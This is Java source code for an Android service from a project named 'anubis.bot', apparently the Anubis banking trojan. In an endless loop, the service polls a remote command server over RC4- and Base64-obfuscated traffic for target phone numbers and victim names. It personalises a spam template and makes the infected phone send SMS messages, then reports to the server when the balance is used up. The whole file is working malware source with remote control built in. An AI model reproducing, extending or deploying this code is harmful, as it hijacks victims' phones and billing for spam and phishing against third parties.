package anubis.bot.myapplication.API.Spam;

import android.app.IntentService;
import android.content.Intent;
import android.content.Context;
import android.util.Base64;

import java.util.concurrent.TimeUnit;

import anubis.bot.myapplication.API.ClassRC4;
import anubis.bot.myapplication.UtilsClass;

public class ServiceSpamSMS extends IntentService {

    public ServiceSpamSMS() {
        super("ServiceSpamSMS");
    }
    UtilsClass utilsClass = new UtilsClass();
    String numberSend = "";

    String LOT_TAG="ServiceSpamSMS";
    public String str_decrypt(String textDE_C, String key)
    {
        UtilsClass utilsClass = new UtilsClass();
        try
        {
            byte[] data = Base64.decode(textDE_C, Base64.DEFAULT);
            textDE_C = new String(data, "UTF-8");
            byte[] detext = utilsClass.hexStringToByteArray(textDE_C);
            ClassRC4 rcd = new ClassRC4(key.getBytes());
            return  new String(rcd.decrypt(detext));
        }catch (Exception ex){ }
        return "";
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        while(true){
            try {TimeUnit.MILLISECONDS.sleep(10000);} catch (InterruptedException e) {e.printStackTrace();}
            String spamSMS = utilsClass.SetRead(this, "spamSMS");
            if (!spamSMS.equals("start"))break;

            if(!utilsClass.isMyServiceRunning(this, ServiceSenderSpamSMS.class)) {

                if (numberSend.length() > 3) {
                    numberSend = "sendsms" + numberSend;
                }

                if(utilsClass.SetRead(this,"indexSMSSPAM").contains("|||||")){
                    utilsClass.SetWrite(this, "spamSMS", "");
                    utilsClass.POST(this, "4", "p=" + utilsClass.trafEnCr(utilsClass.ID_B(this) + "|Ended balance, SMS spam stopped!|"));
                }

                String getNumber = utilsClass.POST(this, "15", "p=" + utilsClass.trafEnCr("getnumber" + numberSend));
                getNumber = utilsClass.trafDeCr(getNumber);
                String nameHolder = "";
                String textSMS = utilsClass.SetRead(this,"textSPAM");

                if(getNumber.contains("/")){
                    nameHolder = getNumber.split("/")[0];
                    getNumber = getNumber.split("/")[1];
                    textSMS = textSMS.replace("{nameholder}",nameHolder);
                }

                if (!getNumber.equals("close")) {
                   // utilsClass.sendSMS(this, getNumber, utilsClass.SetRead(this, "textSPAM"));
                    utilsClass.Log(LOT_TAG,"number: " + getNumber + "  msg: " + textSMS);
                    startService(new Intent(this, ServiceSenderSpamSMS.class)
                                .putExtra("number",getNumber)
                                .putExtra("msg",textSMS));

                    if(nameHolder.length()>2){
                        numberSend = nameHolder+"/"+getNumber;
                    }else{
                        numberSend = getNumber;
                    }

                } else {
                    utilsClass.SetWrite(this, "spamSMS", "");
                    break;
                }
            }
        }
        stopSelf();
    }
}
